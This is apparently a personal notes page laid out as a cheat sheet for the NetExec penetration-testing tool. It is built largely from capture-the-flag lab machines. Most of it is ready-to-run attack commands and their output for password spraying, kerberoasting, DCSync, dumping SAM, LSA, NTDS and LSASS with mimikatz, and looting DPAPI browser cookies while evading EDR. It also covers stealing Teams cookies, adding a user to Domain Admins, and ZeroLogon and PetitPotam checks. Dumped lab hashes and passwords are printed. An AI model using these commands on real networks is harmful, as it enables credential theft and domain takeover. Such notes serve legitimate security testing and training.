{"index":{"title":"index","links":[],"tags":[],"content":"NetExec\nNetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks\n\nNetExec can exploit multiple protocols like :\nprotocols:\n  available protocols\n \n  {smb,ssh,ldap,ftp,wmi,winrm,rdp,vnc,mssql}\n    smb                 own stuff using SMB\n    ssh                 own stuff using SSH\n    ldap                own stuff using LDAP\n    ftp                 own stuff using FTP\n    wmi                 own stuff using WMI\n    winrm               own stuff using WINRM\n    rdp                 own stuff using RDP\n    vnc                 own stuff using VNC\n    mssql               own stuff using MSSQL\nInstall\napt install pipx git\npipx ensurepath\npipx install git+github.com/Pennyw0rth/NetExec\nor use the static binaries from here\nRelease Binaries\n\nGenerate /etc/hosts file of a target IP\n❯ sudo nxc smb 10.129.61.82 --generate-hosts-file /etc/hosts\n\nFind Domain SID\n❯ nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid\nLDAP        DC1.scrm.local  389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)\nLDAPS       DC1.scrm.local  636    DC1.scrm.local   [+] scrm.local\\sqlsvc \nLDAPS       DC1.scrm.local  636    DC1.scrm.local   Domain SID S-1-5-21-2743207045-1827831105-2542523200\nList DC IP\n\nldap —dc-list flag listing Domain Controllers and finds IP Addresses (If accessible)\n\n❯ nxc ldap 10.129.61.82 -u user -p pass --dc-list\nCheck LDAP Signing\n\nUsing the module ldap-checker you can verify if ldap require channel binding or not\n\n❯ nxc ldap 10.129.61.82 -u user -p pass -M ldap-checker\nCheck if target has AV on\n❯ nxc smb authority.htb -u svc_ldap -p &#039;lDaP_1n_th3_cle4r!&#039; -M enum_av\nEnable RDP\n\nCredentials Required\n\n❯ nxc smb 10.129.61.82 -u user -p pass -M rdp -o ACTION=enable\nTake Screenshot from RDP remotely\n❯ nxc rdp 10.129.61.82 -u user -p pass --screenshot --screentime &lt;second&gt;\n\nEnumerate smb\n❯ nxc smb cicada.htb -u a -p &#039;&#039; --shares\nEnumerate Users\n❯ nxc smb cicada.htb -u a -p &#039;&#039; --rid-brute\n❯ nxc smb cicada.htb -u a -p &#039;&#039; --users\nSearch files with read access in SMB\n❯ nxc smb cicada.htb -u a -p &#039;&#039; -M spider_plus\nPassword Spray\n❯ nxc smb cicada.htb -u users.txt -p &#039;Cicada$M6Corpb*@Lp#nZp!8&#039; --continue-on-success\nExecute command\n\nCredentials required\n\n❯ nxc winrm cicada.htb -u emily.oscars -p &#039;Q!3@Lp#M6b*7t*Vt&#039; -X &#039;cat C:\\Users\\emily.oscars.CICADA\\desktop\\user.txt&#039;\nASREP-Roasting\n\nwithout password\n\n❯ nxc ldap 10.10.10.192 -u users.txt -p &#039;&#039; --asreproast output.txt\n\n\nwith password\n\n❯ nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost oscp.local\nKerberoasting\n❯ nxc ldap 10.10.10.100 -u svc_tgs -p GPPstillStandingStrong2k18 --kerberoasting output.txt\n\nFind Misconfigured Delegation\n\nNetExec allows you to retrieve the list of all misconfigured delegations\n\n❯ nxc ldap 192.168.56.11 -u eddard.stark -p FightP3aceAndHonor! --find-delegation\n \nSMB    192.168.56.11   445   WINTERFELL   [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nLDAP   192.168.56.11   389   WINTERFELL   [+] north.sevenkingdoms.local\\eddard.stark:FightP3aceAndHonor! (Pwn3d!)\nLDAP   192.168.56.11   389   WINTERFELL   AccountName  AccountType DelegationType                     DelegationRightsTo\nLDAP   192.168.56.11   389   WINTERFELL   ------------ ----------- ---------------------------------- ----------------------------------------------------------------\nLDAP   192.168.56.11   389   WINTERFELL   sansa.stark  Person      Unconstrained                      N/A\nLDAP   192.168.56.11   389   WINTERFELL   jon.snow     Person      Constrained w/ Protocol Transition CIFS/winterfell, CIFS/winterfell.north.sevenkingdoms.local\nLDAP   192.168.56.11   389   WINTERFELL   jon.snow     Person      Resource-Based Constrained         RBCD-COMPUTER$\nLDAP   192.168.56.11   389   WINTERFELL   CASTELBLACK$ Computer    Constrained                        HTTP/winterfell, HTTP/winterfell.north.sevenkingdoms.local\nLDAP   192.168.56.11   389   WINTERFELL   пользователь Person      Resource-Based Constrained         WINTERFELL$\nUnconstrained Delegation\nNetExec allows you to retrieve the list of all computers and users with the flag TRUSTED_FOR_DELEGATION\n❯ nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation\nRead DACL Rights\nLDAP module that permits to read and export the DACLs of one or mulitple objects !\n\nRead all the ACEs of the Administrator\n\n❯ nxc ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read\n \nSMB         lab-dc.lab.local 445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:lab.local) (signing:False) (SMBv1:False)\nLDAP        lab-dc.lab.local 389    LAB-DC           [+] lab.local\\\nDACLREAD    lab-dc.lab.local 389    LAB-DC           Target principal found in LDAP (CN=Administrator,CN=Users,DC=lab,DC=local)\n[*]  ACE[0] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ReadProperty\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : User-Account-Restrictions (4c164200-20c0-11d0-a768-00aa006e0529)\n[*]    Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)\n[*]    Trustee (SID)             : BUILTIN\\Pre-Windows 2000 Compatible Access (S-1-5-32-554)\n[*]  ACE[1] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ReadProperty\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : User-Account-Restrictions (4c164200-20c0-11d0-a768-00aa006e0529)\n[*]    Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)\n[*]    Trustee (SID)             : BUILTIN\\Pre-Windows 2000 Compatible Access (S-1-5-32-554)\n[*]  ACE[2] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ReadProperty\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : User-Logon (5f202010-79a5-11d0-9020-00c04fc2d4cf)\n[*]    Inherited type (GUID)     : inetOrgPerson (4828cc14-1437-45bc-9b07-ad6f015e5f28)\n[*]    Trustee (SID)             : BUILTIN\\Pre-Windows 2000 Compatible Access (S-1-5-32-554)\n[SNIP]\n\nRead all the rights the BlWasp user has on the Administrator\n\n❯ nxc ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=BlWasp\n \nSMB         lab-dc.lab.local 445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:lab.local) (signing:False) (SMBv1:False)\nLDAP        lab-dc.lab.local 389    LAB-DC           [+] lab.local\\\nDACLREAD    lab-dc.lab.local 389    LAB-DC           Found principal SID to filter on: S-1-5-21-2570265163-3918697770-3667495639-1103\nDACLREAD    lab-dc.lab.local 389    LAB-DC           Target principal found in LDAP (CN=Administrator,CN=Users,DC=lab,DC=local)\n[*]  ACE[10] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ControlAccess\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : User-Force-Change-Password (00299570-246d-11d0-a768-00aa006e0529)\n[*]    Trustee (SID)             : blwasp (S-1-5-21-2570265163-3918697770-3667495639-1103)\n\nRead all the principals that have DCSync rights on the domain\n\n❯ nxc ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET_DN=&quot;DC=lab,DC=LOCAL&quot; ACTION=read RIGHTS=DCSync\n \nSMB         lab-dc.lab.local 445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:lab.local) (signing:False) (SMBv1:False)\nLDAP        lab-dc.lab.local 389    LAB-DC           [+] lab.local\\\nDACLREAD    lab-dc.lab.local 389    LAB-DC           Target principal found in LDAP (DC=lab,DC=local)\n[*]  ACE[13] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ControlAccess\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n[*]    Trustee (SID)             : Domain Controllers (S-1-5-21-2570265163-3918697770-3667495639-516)\n[*]  ACE[14] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ControlAccess\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n[*]    Trustee (SID)             : blwasp (S-1-5-21-2570265163-3918697770-3667495639-1103)\n[*]  ACE[27] info                \n[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE\n[*]    ACE flags                 : None\n[*]    Access mask               : ControlAccess\n[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT\n[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n[*]    Trustee (SID)             : Administrators (S-1-5-32-544)\nDump gMSA\nExtract gmsa credentials accounts\nUsing the protocol LDAP you can extract the password of a gMSA account if you have the right.\n\n❯ nxc ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --gmsa\n\nBloodHound Ingestor\n❯ nxc ldap &lt;ip&gt; -u user -p pass --bloodhound -ns &lt;ns-ip&gt; --collection All\n\nCheck which groups our user belongs to using the groupmembership module for LDAP\n❯ nxc ldap 10.10.11.35 -u emily.oscars -p &#039;Q!3@Lp#M6b*7t*Vt&#039; -M groupmembership -o USER=&quot;emily.oscars&quot;\n \nLDAP        10.10.11.35     389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)\nLDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)\nGROUPMEM... 10.10.11.35     389    CICADA-DC        [+] User: emily.oscars is member of following groups:\nGROUPMEM... 10.10.11.35     389    CICADA-DC        Remote Management Users\nGROUPMEM... 10.10.11.35     389    CICADA-DC        Backup Operators\nGROUPMEM... 10.10.11.35     389    CICADA-DC        Domain Users\nIf your user is part of Group Backup Operators we can directly do DCSync using backup_operator module\n❯ nxc smb 10.10.11.35 -u emily.oscars -p &#039;Q!3@Lp#M6b*7t*Vt&#039; -M backup_operator\n \nSMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\\emily.oscars:Q!3@Lp#M6b*7t*Vt\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Triggering RemoteRegistry to start through named pipe...\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Saved HKLM\\SAM to \\\\10.10.11.35\\SYSVOL\\SAM\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Saved HKLM\\SYSTEM to \\\\10.10.11.35\\SYSVOL\\SYSTEM\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Saved HKLM\\SECURITY to \\\\10.10.11.35\\SYSVOL\\SECURITY\nSMB         10.10.11.35     445    CICADA-DC        [*] Copying &quot;SAM&quot; to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SAM&quot;\nSMB         10.10.11.35     445    CICADA-DC        [+] File &quot;SAM&quot; was downloaded to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SAM&quot;\nSMB         10.10.11.35     445    CICADA-DC        [*] Copying &quot;SECURITY&quot; to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SECURITY&quot;\nSMB         10.10.11.35     445    CICADA-DC        [+] File &quot;SECURITY&quot; was downloaded to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SECURITY&quot;\nSMB         10.10.11.35     445    CICADA-DC        [*] Copying &quot;SYSTEM&quot; to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SYSTEM&quot;\nSMB         10.10.11.35     445    CICADA-DC        [+] File &quot;SYSTEM&quot; was downloaded to &quot;/home/serioton/.nxc/logs/CICADA-DC_10.10.11.35_2025-02-11_185959.SYSTEM&quot;\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::\nBACKUP_O... 10.10.11.35     445    CICADA-DC        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nBACKUP_O... 10.10.11.35     445    CICADA-DC        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nBACKUP_O... 10.10.11.35     445    CICADA-DC        $MACHINE.ACC:plain_password_hex:6209748a5ab74c44bd98fc5015b6646467841a634c4a1b2d6733289c33f76fc6427f7ccd8f6d978a79eec3ae49eb8c0b5b14e193ec484ea1152e8a04e01a3403b3111c0373d126a566660a7dd083aec1921d53a82bc5129408627ae5be5e945ed58cfb77a2a50e9ffe7e6a4531febd965181e528815d264885921118fb7a74eff51306dbffa4d6a0c995be5c35063576fc4a3eba39d0168d4601da0a0c12748ae870ff36d7fb044649032f550f04c017f6d94675b3517d06450561c71ddf8734100898bf2c19359c69d1070977f070e3b8180210a92488534726005588c0f269a7e182c3c04b96f7b5bc4af488e128f8\nBACKUP_O... 10.10.11.35     445    CICADA-DC        $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696\nBACKUP_O... 10.10.11.35     445    CICADA-DC        dpapi_machinekey:0x0e3d4a419282c47327eb03989632b3bef8998f71\nBACKUP_O... 10.10.11.35     445    CICADA-DC        NL$KM:cc1501f764391e7a5e538cc174e62b01369b50b8d07223d9b6c56e922f5708d81eba8e8123250327364c19b496cd251f8ff97f5d71e66e8cffcbeb5e4ea4e696\nSMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Dumping NTDS...\nSMB         10.10.11.35     445    CICADA-DC        [+] Dumping the NTDS, this could take a while so go grab a redbull...\nSMB         10.10.11.35     445    CICADA-DC        [-] Could not connect: timed out\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Cleaning dump with user Administrator and hash 2b87e7c93a3e8a0ea4a581937016f341 on domain cicada.htb\nBACKUP_O... 10.10.11.35     445    CICADA-DC        [*] Successfully deleted dump files !\nDefeating LAPS\nUsing NetExec when LAPS installed on the domain\nIf LAPS is used inside the domain, is can be hard to use NetExec to execute a command on every\ncomputer on the domain.\nTherefore, a new core option has been added --laps ! If you have compromised an accout that can read LAPS password you can use NetExec like this\nin this case , we can see our user can read Laps password.\n\nnow let’s use nxc  to do this attack\n❯ nxc winrm &lt;IP&gt; -u username -p &#039;password&#039; --laps\n\nokay that’s our LAPS password.\nManual Way to Read Laps Password\nGet-ADComputer DC01 -property &#039;ms-mcs-admpwd&#039;\n\nnow let’s try to connect as administrator with that password &amp; see if it works or not\n❯ evil-winrm -i timelapse.htb -S -u administrator -p &#039;q.p+T{80W7t4Er#jzl]OcI6O&#039;\n\nbingo!! it works :D\nDumping All Files from SMB\n❯ nxc smb 10.10.10.10 -u &#039;user&#039; -p &#039;pass&#039; -M spider_plus -o DOWNLOAD_FLAG=True\nGet and Put Files\nSend a File to the Remote Target\nSend a local file to the remote target\n❯ nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\\\Windows\\\\Temp\\\\whoami.txt\nGet a File From the Remote Target\nGet a remote file on the remote target\n❯ nxc smb 172.16.251.152 -u user -p pass --get-file  \\\\Windows\\\\Temp\\\\whoami.txt /tmp/whoami.txt\nChecking for Spooler &amp; WebDav\nChecking if the Spooler Service is Running\n❯ nxc smb &lt;ip&gt; -u &#039;user&#039; -p &#039;pass&#039; -M spooler\nChecking if the WebDav Service is Running\n❯ nxc smb &lt;ip&gt; -u &#039;user&#039; -p &#039;pass&#039; -M webdav\nImpersonate logged-on Users\nUse Sessions from logged-on Users to execute arbitrary commands using schtask_as\n\nYou need at least local admin privilege on the remote target\n\nThe Module schtask_as can execute commands on behalf on other users which has sessions on the target\nAttack Vector :\n\nEnumerate logged-on users on your Target\n\n❯ nxc smb &lt;ip&gt; -u &lt;localAdmin&gt; -p &lt;password&gt; --loggedon-users\n\nExecute commands on behalf of other users\n\n❯ nxc smb &lt;ip&gt; -u &lt;localAdmin&gt; -p &lt;password&gt; -M schtask_as -o USER=&lt;logged-on-user&gt; CMD=&lt;cmd-command&gt;\n\nCustom command to add an user to the domain admin group for easy copy &amp; pasting:\npowershell.exe \\&quot;Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity &#039;Domain Admins&#039; -Members USER.NAME}\\&quot;\nSteal Microsoft Teams Cookies\n\nYou need at least local admin privilege on the remote target\n\nNew NetExec module to dump Microsoft Teams cookies. You can use them to retrieve information like users, messages, groups etc or send directly messages in Teams.\n❯ nxc smb &lt;ip&gt; -u user -p pass -M teams_localdb\nObtaining Credentials\nDump SAM\n\nYou need at least local admin privilege on the remote target, use option —local-auth if your user is a local account\n\n❯ nxc smb 192.168.1.0/24 -u UserNAme -p &#039;PASSWORDHERE&#039; --sam\nDump LSA\n\nRequires Domain Admin or Local Admin Priviledges on target Domain Controller\n\n❯ nxc smb 192.168.1.0/24 -u UserNAme -p &#039;PASSWORDHERE&#039; --lsa\nDump NTDS.dit\n\nRequires Domain Admin or Local Admin Priviledges on target Domain Controller\n\n❯ nxc smb 192.168.1.100 -u UserNAme -p &#039;PASSWORDHERE&#039; --ntds\n❯ nxc smb 192.168.1.100 -u UserNAme -p &#039;PASSWORDHERE&#039; --ntds --users\n❯ nxc smb 192.168.1.100 -u UserNAme -p &#039;PASSWORDHERE&#039; --ntds --users --enabled\n❯ nxc smb 192.168.1.100 -u UserNAme -p &#039;PASSWORDHERE&#039; --ntds vss\n\nYou can also DCSYNC with the computer account of the DC\n\nThere is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py\n❯ nxc smb 192.168.1.100 -u UserNAme -p &#039;PASSWORDHERE&#039; -M ntdsutil\nDump LSASS\n\nYou need at least local admin privilege on the remote target, use option —local-auth if your user is a local account\n\nUsing Lsassy\n❯ nxc smb 192.168.255.131 -u administrator -p pass -M lsassy\nUsing nanodump\n❯ nxc smb 192.168.255.131 -u administrator -p pass -M nanodump\nusing MimiKatz\n❯ nxc smb 192.168.255.131 -u administrator -p pass -M mimikatz\n \n❯ nxc smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND=&#039;&quot;lsadump::dcsync /domain:domain.local /user:krbtgt&quot;\nDump KeePass\n❯ nxc smb &lt;ip&gt; -u user -p pass -M keepass_discover\n❯ nxc smb &lt;ip&gt; -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH=&quot;path_from_module_discovery&quot;\nDump DPAPI\nyou can dump all secrets from Credential Manager, Chrome, Edge, Firefox\n\nYou need at least local admin privilege on the remote target, use option —local-auth if your user is a local account\n\n\ncookies : Collect every cookies in browsers\nnosystem : Won’t collect system credentials. This will prevent EDR from stopping you from looting passwords 🔥\n\n❯ nxc smb &lt;ip&gt; -u user -p password --dpapi\n❯ nxc smb &lt;ip&gt; -u user -p password --dpapi cookies\n❯ nxc smb &lt;ip&gt; -u user -p password --dpapi nosystem\nDump WIFI password\nGet the WIFI password register in Windows\n\nYou need at least local admin privilege on the remote target, use option —local-auth if your user is a local account\n\n❯ nxc smb &lt;ip&gt; -u user -p pass -M wireless\nExtract gMSA Secrets\nConvert gSAM id, convert gmsa lsa to ntlm\nNetExec offer multiple choices when you found a gmsa account in the LSA\n❯ nxc ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724\n \n❯ nxc ldap &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --gmsa-decrypt-lsa &#039;_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724:01000000240200001000120114021c02fbb096d10991bb88c3f54e153807b4c1cc009d30bc3c50fd6f72c99a1e79f27bd0cbd4df69fdf08b5cf6fa7928cf6924cf55bfd8dd505b1da26ddf5695f5333dd07d08673029b01082e548e31f1ad16c67db0116c6ab0f8d2a0f6f36ff30b160b7c78502d5df93232f72d6397b44571d1939a2d18bb9c28a5a48266f52737c934669e038e22d3ba5a7ae63a608f3074c520201f372d740fddec77a8fed4ddfc5b63ce7c4643b60a8c4c739e0d0c7078dd0c2fcbc2849e561ea2de1af7a004b462b1ff62ab4d3db5945a6227a58ed24461a634b85f939eeed392cf3fe9359f28f3daa8cb74edb9eef7dd38f44ed99fa7df5d10ea1545994012850980a7b3becba0000d22d957218fb7297b216e2d7272a4901f65c93ee0dbc4891d4eba49dda5354b0f2c359f185e6bb943da9bcfbd2abda591299cf166c28cb36907d1ba1a8956004b5e872ef851810689cec9578baae261b45d29d99aef743f3d9dcfbc5f89172c9761c706ea3ef16f4b553db628010e627dd42e3717208da1a2902636d63dabf1526597d94307c6b70a5acaf4bb2a1bdab05e38eb2594018e3ffac0245fcdb6afc5a36a5f98f5910491e85669f45d02e230cb633a4e64368205ac6fc3b0ba62d516283623670b723f906c2b3d40027791ab2ae97a8c5c135aae85da54a970e77fb46087d0e2233d062dcd88f866c12160313f9e6884b510840e90f4c5ee5a032d40000f0650a4489170000f0073a9188170000&#039;\nScan for Vulnerabilities\nWhen you start your internal pentest, these are the first modules you should try:\nZeroLogon\n❯ nxc smb &lt;ip&gt; -u &#039;&#039; -p &#039;&#039; -M zerologon\nPetitPotam\n❯ nxc smb &lt;ip&gt; -u &#039;&#039; -p &#039;&#039; -M petitpotam\nnoPAC\n\nYou need a credential for this one\n\n❯ nxc smb &lt;ip&gt; -u &#039;user&#039; -p &#039;pass&#039; -M nopac\nAllChecks\n❯ nxc smb authority.htb -u svc_ldap -p &#039;lDaP_1n_th3_cle4r!&#039; -M coerce_plus "}}